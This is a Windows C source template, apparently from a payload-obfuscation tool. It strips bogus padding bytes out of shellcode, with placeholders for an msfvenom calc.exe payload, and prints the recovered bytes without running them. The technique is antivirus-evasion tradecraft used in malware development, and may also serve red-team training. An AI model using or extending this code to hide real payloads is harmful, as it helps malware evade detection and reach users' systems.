#include <windows.h>
#include <stdio.h>

#define SHELLCODE_SIZE	{{SHELLCODE_SIZE}}
#define MISSBYTES_SIZE	{{MISSBYTES_SIZE}}

// Printing the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X\n", Data[i]);
		}
	}

	printf("};\n\n\n");

}

BOOL IsMissingByte(BYTE byte, PBYTE MissingBytes) {
	// Verify if byte is in the MissingBytes
	for(int i = 0; i < MISSBYTES_SIZE; i++) {
		if (byte == MissingBytes[i])
			return TRUE;
	}

	return FALSE;
}

// Deobfuscate the shellcode
VOID DeobfuscateShellcode(PBYTE ObfuscatedShellcode, PBYTE MissingBytes, PBYTE DeobfuscatedShellcode, unsigned int ShellCodeSize) {
    int deobsIndex = 0;

    // Iterate over the Obfuscated shellcode
    for (int i = 0; ; i++) {
		// If the byte is not in the MissingBytes, then assign it to the Deobfuscated shellcode
		if(!IsMissingByte(ObfuscatedShellcode[i], MissingBytes)) {			
			DeobfuscatedShellcode[deobsIndex] = ObfuscatedShellcode[i];
			deobsIndex++;
		}

        // If the deobsIndex is equal to SIZE, then break
        if (deobsIndex == ShellCodeSize) {
            break;
        }
    }
}

// Byte added as bogus
unsigned char MissingBytes[] = {
	{{MISSING_BYTES}}
} ;

// msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char ObsShellcode[] = {
	{{SHELLCODE}}
};

int main() {
	// Printing the address of the shellcode
	printf("[i] shellcode : 0x%p \n", ObsShellcode);
	printf("[#] Press <Enter> To Decrypt ...");
	getchar();

	// Allocating buffer to hold decrypted shellcode
	PBYTE DeobsShellcode = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SHELLCODE_SIZE);

	// Copy encrypted shellcode to decrypted shellcode buffer
	if (DeobsShellcode)
		// Deobfuscate the shellcode
        DeobfuscateShellcode(ObsShellcode, MissingBytes, DeobsShellcode, SHELLCODE_SIZE);

	// Printing the decrypted buffer
	PrintHexData("Shellcode", DeobsShellcode, SHELLCODE_SIZE);

	// Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, DeobsShellcode);

	// Exit
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}
